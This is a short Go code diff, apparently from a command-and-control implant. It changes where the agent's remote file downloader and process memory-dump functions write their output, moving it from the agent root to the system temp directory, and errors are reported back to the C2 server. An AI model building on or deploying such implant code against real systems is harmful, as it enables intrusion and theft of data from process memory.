@@ -385,7 +385,7 @@ func runFileDownloader(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
 	}
-	downloadPath := fmt.Sprintf("%s/%s", common.RuntimeConfig.AgentRoot, util.FileBaseName(path))
+	downloadPath := fmt.Sprintf("%s/%s", os.TempDir(), util.FileBaseName(path))
 	err := c2transport.FetchFileKCP(url, path, downloadPath, checksum)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "Error: %v\n", err)
@@ -401,7 +401,7 @@ func runMemDump(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: invalid PID\n")
 		return
 	}
-	outPath := fmt.Sprintf("%s/%d", common.RuntimeConfig.AgentRoot, pid)
+	outPath := fmt.Sprintf("%s/%d", os.TempDir(), pid)
 	err := os.MkdirAll(outPath, 0o700)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "Error: %v\n", err)
@@ -432,7 +432,7 @@ func runMemDump(cmd *cobra.Command, args []string) {
 			}
 		}
 	}
-	err = os.Chdir(common.RuntimeConfig.AgentRoot)
+	err = os.Chdir(os.TempDir())
 	if err != nil {
 		c2transport.NotifyC2(cmd, "Error: %v\n", err)
 		return
